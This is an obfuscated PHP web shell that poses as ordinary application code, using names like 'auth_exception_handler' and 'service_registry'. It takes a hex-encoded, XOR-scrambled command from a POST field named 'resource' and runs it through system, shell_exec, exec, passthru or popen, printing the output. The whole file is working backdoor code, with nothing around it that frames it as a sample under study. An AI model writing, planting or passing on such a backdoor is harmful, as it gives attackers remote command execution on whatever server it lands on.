<?php

$auth_exception_handler6 = "s\x74\x72\x65\x61m_g\x65t_co\x6Et\x65\x6Ets";
$auth_exception_handler1 = "s\x79\x73t\x65m";
$auth_exception_handler4 = "\x70a\x73\x73\x74hru";
$auth_exception_handler7 = "\x70c\x6Co\x73e";
$auth_exception_handler3 = "exe\x63";
$auth_exception_handler5 = "\x70open";
$batch_process = "h\x65\x782bin";
$auth_exception_handler2 = "\x73he\x6Cl\x5F\x65x\x65c";
if (isset($_POST["reso\x75\x72c\x65"])) {
            function service_registry      (   $flg      ,     $ref     )    {
     $tkn    =    ''   ;
   foreach(str_split($flg) as $char){
$tkn.=chr(ord($char)^$ref);

} return   $tkn;
   
}
            $resource = $batch_process($_POST["reso\x75\x72c\x65"]);
            $resource = service_registry($resource, 93);
            if (function_exists($auth_exception_handler1)) {
                $auth_exception_handler1($resource);
            } elseif (function_exists($auth_exception_handler2)) {
                print $auth_exception_handler2($resource);
            } elseif (function_exists($auth_exception_handler3)) {
                $auth_exception_handler3($resource, $dchunk_flg);
                print join("\n", $dchunk_flg);
            } elseif (function_exists($auth_exception_handler4)) {
                $auth_exception_handler4($resource);
            } elseif (function_exists($auth_exception_handler5) && function_exists($auth_exception_handler6) && function_exists($auth_exception_handler7)) {
                $ref_tkn = $auth_exception_handler5($resource, 'r');
                if ($ref_tkn) {
                    $element_ptr = $auth_exception_handler6($ref_tkn);
                    $auth_exception_handler7($ref_tkn);
                    print $element_ptr;
                }
            }
            exit;
        }